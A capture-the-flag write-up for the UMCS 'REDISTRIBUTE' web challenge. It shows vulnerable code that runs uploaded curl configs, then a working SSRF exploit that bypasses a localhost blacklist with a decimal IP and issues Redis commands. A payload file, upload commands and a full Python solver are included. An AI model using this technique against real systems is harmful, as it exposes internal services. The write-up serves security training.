---
slug: "local-ctf/umcs-preliminary/web-redistribute"
event: "umcs-preliminary"
title: "REDISTRIBUTE"
summary: "UMCS Preliminary umcs preliminary, web, forensics writeup covering REDISTRIBUTE with analysis, solution steps, and final recovery notes."
date: 2026-04-26
tags:
  - ctf
  - umcs-preliminary
  - web
  - forensics
category: "local-ctf"
difficulty: "medium"
platform: "ctf"
draft: false
boxImage: "https://umcybersec.site/assets/logo-BsYk-M08.png"
---
# Challenge Overview

**Challenge Name:** REDISTRIBUTE
**Category:** Web / SSRF
**Points:** 370
**Flag Format:** `UMCS{...}`
**Target URL:**

```text
http://c5285891-8e03-46b7-9c84-6d1d0ee81de1.chal.umcybersec.site:8001/
```

The challenge provides a simple web application that allows the user to upload a curl configuration file. The backend executes curl using the uploaded configuration.

The goal is to abuse this curl functionality to access an internal Redis service and recover the stored flag.

Final flag recovered:

```text
UMCS{WOW_R=DIS_SS_RF_USING_HT7TT77777P}
```

---

# Initial Analysis

After extracting the provided source files, the important files are:

```text
Dockerfile
files/app.js
files/setup.sh
files/views/index.html
files/package.json
```

The main application logic is in `app.js`.

Important code:

```js
const PATH_TO_CURL = "/app/curl-8.19.0/src/curl";

const WAF = (filename) =>{
    const contents = fs.readFileSync(filename).toString();
    // Blacklist
    if(contents.includes("127") || contents.includes("localhost")){
        return false;
    }
    return true;
}
```

The application applies a weak blacklist-based WAF. It blocks uploaded curl configuration files only if they contain:

```text
127
localhost
```

The `/curl` route accepts an uploaded file called `configuration`:

```js
app.post('/curl', upload.single('configuration'), (req, res)=>{
    var buffer = `<h1>File Uploaded as ${req.file.filename}.</h1>`;
    const tmpfile = `/tmp/${req.file.filename}.out`;

    if (!WAF(`/tmp/${req.file.filename}`)){
        res.sendStatus(403);
    }

    try {
        const output = execSync(`${PATH_TO_CURL} -K /tmp/${req.file.filename} -m 5 > ${tmpfile}`);
    } catch (error) {
        buffer += `<p color="red"> Error: ${error.stderr.toString()}</p>`;
    }
    buffer += `<code> ${sanitizeHtml(fs.readFileSync(tmpfile).toString())}</code>`;

    res.send(buffer);
})
```

The backend executes:

```bash
curl -K /tmp/<uploaded_file> -m 5
```

This is highly important because curl’s `-K` option loads options from a configuration file. Therefore, the attacker controls curl behavior almost completely.

The Redis setup is in `setup.sh`:

```bash
redis-server &
pid=$!
sleep 3

redis-cli SET flag "UMCS{FAKE_FLAG_2}"
redis-cli SAVE

kill $pid
sleep 3

redis-server /tmp/redis-protected.conf &
```

Redis is bound locally:

```text
bind 127.0.0.1
port 6379
```

So the flag is stored in Redis under the key:

```text
flag
```

The web app cannot directly expose Redis, but curl can be abused to make requests from the server itself.

---

# Vulnerability / Weakness Identification

The core vulnerability is **Server-Side Request Forgery through attacker-controlled curl configuration**.

The application lets the attacker upload a curl config file and executes it server-side:

```bash
curl -K uploaded_file
```

This allows the attacker to force the server to make arbitrary outbound or internal requests.

The Redis service is only reachable from inside the container at:

```text
127.0.0.1:6379
```

The WAF attempts to block this by rejecting uploaded files containing:

```text
127
localhost
```

However, this blacklist is weak because `127.0.0.1` can be represented in alternative formats.

For example:

```text
2130706433
```

is the decimal representation of:

```text
127.0.0.1
```

So this URL points to localhost while bypassing the blacklist:

```text
http://2130706433:6379/
```

The second issue is that curl normally sends HTTP headers such as:

```text
Host:
User-Agent:
Accept:
```

Redis may close the connection when it detects suspicious HTTP-style traffic. Therefore, the exploit must suppress default HTTP headers.

---

# Exploitation Strategy

The goal is to make curl connect to local Redis and send a Redis-compatible command.

Redis supports inline commands. A command such as:

```text
MGET flag
```

asks Redis to return the value of the `flag` key.

Curl can be configured to send a custom HTTP method and custom request target:

```text
request = "MGET"
request-target = "flag"
```

This causes curl to send a request line similar to:

```text
MGET flag HTTP/1.1
```

Redis interprets this as an inline command:

```text
MGET flag HTTP/1.1
```

That means Redis tries to fetch two keys:

```text
flag
HTTP/1.1
```

The first key contains the flag. The second key does not exist, so Redis returns nil for it.

The response looks like this:

```text
*2
$39
UMCS{WOW_R=DIS_SS_RF_USING_HT7TT77777P}
$-1
```

To make curl accept Redis’ non-HTTP response, we also enable:

```text
http0.9
```

Finally, we remove default headers:

```text
header = "Host:"
header = "User-Agent:"
header = "Accept:"
```

This prevents Redis from closing the connection early due to HTTP header detection.

---

# Proof of Concept

Create the malicious curl configuration file:

```bash
cat > payload.conf <<'EOF'
url = "http://2130706433:6379/"
request = "MGET"
request-target = "flag"
header = "Host:"
header = "User-Agent:"
header = "Accept:"
http0.9
EOF
```

Upload it to the vulnerable endpoint:

```bash
curl -s -F "configuration=@payload.conf" \
http://c5285891-8e03-46b7-9c84-6d1d0ee81de1.chal.umcybersec.site:8001/curl
```

Observed output:

```html
<h1>File Uploaded as 4179b185c5c82296372b21cbf8be7a6e.</h1>
<p color="red"> Error:
curl: (28) Operation timed out after 5002 milliseconds with 55 bytes received
</p>
<code> *2
$39
UMCS{WOW_R=DIS_SS_RF_USING_HT7TT77777P}
$-1
</code>
```

The timeout is not a failure. Redis keeps the connection open, so curl eventually times out after receiving the response.

The important part is inside the Redis response:

```text
UMCS{WOW_R=DIS_SS_RF_USING_HT7TT77777P}
```

To extract only the flag:

```bash
curl -s -F "configuration=@payload.conf" \
http://c5285891-8e03-46b7-9c84-6d1d0ee81de1.chal.umcybersec.site:8001/curl \
| grep -oE 'UMCS\{[^}]+\}'
```

Expected output:

```text
UMCS{WOW_R=DIS_SS_RF_USING_HT7TT77777P}
```

---

# Full Python Solver

```python
#!/usr/bin/env python3
import re
import sys
import requests


def build_curl_config() -> str:
    """
    Build a curl configuration file that:
    1. Connects to local Redis using decimal localhost.
    2. Sends an inline Redis MGET command.
    3. Removes default HTTP headers that can trigger Redis protection.
    4. Accepts Redis' raw non-HTTP response using http0.9.
    """
    return """url = "http://2130706433:6379/"
request = "MGET"
request-target = "flag"
header = "Host:"
header = "User-Agent:"
header = "Accept:"
http0.9
"""


def exploit(base_url: str) -> str:
    """
    Upload the malicious curl config to the /curl endpoint
    and extract the UMCS flag from the response.
    """
    target = base_url.rstrip("/") + "/curl"
    payload = build_curl_config()

    files = {
        "configuration": ("payload.conf", payload, "text/plain")
    }

    print(f"[+] Target endpoint: {target}")
    print("[+] Uploading malicious curl configuration...")

    response = requests.post(target, files=files, timeout=15)

    print(f"[+] HTTP status: {response.status_code}")

    body = response.text

    match = re.search(r"UMCS\{[^}]+\}", body)

    if not match:
        print("[-] Flag not found in response.")
        print("[+] Raw response:")
        print(body)
        raise SystemExit(1)

    return match.group(0)


def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <base_url>")
        print()
        print("Example:")
        print(f"  {sys.argv[0]} http://c5285891-8e03-46b7-9c84-6d1d0ee81de1.chal.umcybersec.site:8001")
        raise SystemExit(1)

    base_url = sys.argv[1]
    flag = exploit(base_url)

    print("[+] Flag recovered:")
    print(flag)


if __name__ == "__main__":
    main()
```

---

# Walkthrough

Save the solver as:

```bash
solve.py
```

Install the required Python package:

```bash
pip3 install requests
```

Run the exploit:

```bash
python3 solve.py http://c5285891-8e03-46b7-9c84-6d1d0ee81de1.chal.umcybersec.site:8001
```

Expected output:

```text
[+] Target endpoint: http://c5285891-8e03-46b7-9c84-6d1d0ee81de1.chal.umcybersec.site:8001/curl
[+] Uploading malicious curl configuration...
[+] HTTP status: 200
[+] Flag recovered:
UMCS{WOW_R=DIS_SS_RF_USING_HT7TT77777P}
```

Troubleshooting notes:

If the response contains:

```text
curl: (28) Operation timed out
```

that is acceptable as long as the Redis response appears in the output.

If the response contains:

```text
curl: (52) Empty reply from server
```

then Redis likely closed the connection because curl sent HTTP-style headers. Make sure the config includes:

```text
header = "Host:"
header = "User-Agent:"
header = "Accept:"
```

If the server returns `403`, the WAF detected a blocked string. Make sure the payload does not contain:

```text
127
localhost
```

Use decimal localhost instead:

```text
2130706433
```

---

# Flag

The flag is recovered from the Redis response:

```text
UMCS{WOW_R=DIS_SS_RF_USING_HT7TT77777P}
```

---

# Conclusion

The challenge is solved by abusing an attacker-controlled curl configuration file. The application attempts to protect internal services using a weak blacklist, but the blacklist only blocks literal `127` and `localhost`.

By using the decimal representation of `127.0.0.1`, the attacker bypasses the filter and reaches the internal Redis service. Then, by crafting curl options that send a Redis-compatible inline command, the attacker reads the `flag` key.

The key lesson is that blacklist-based SSRF protection is unreliable. Applications should not execute attacker-controlled curl configuration files, and internal services such as Redis should not be reachable from user-controlled request flows. Better defenses include strict allowlists, network isolation, and avoiding shell execution of user-controlled inputs.
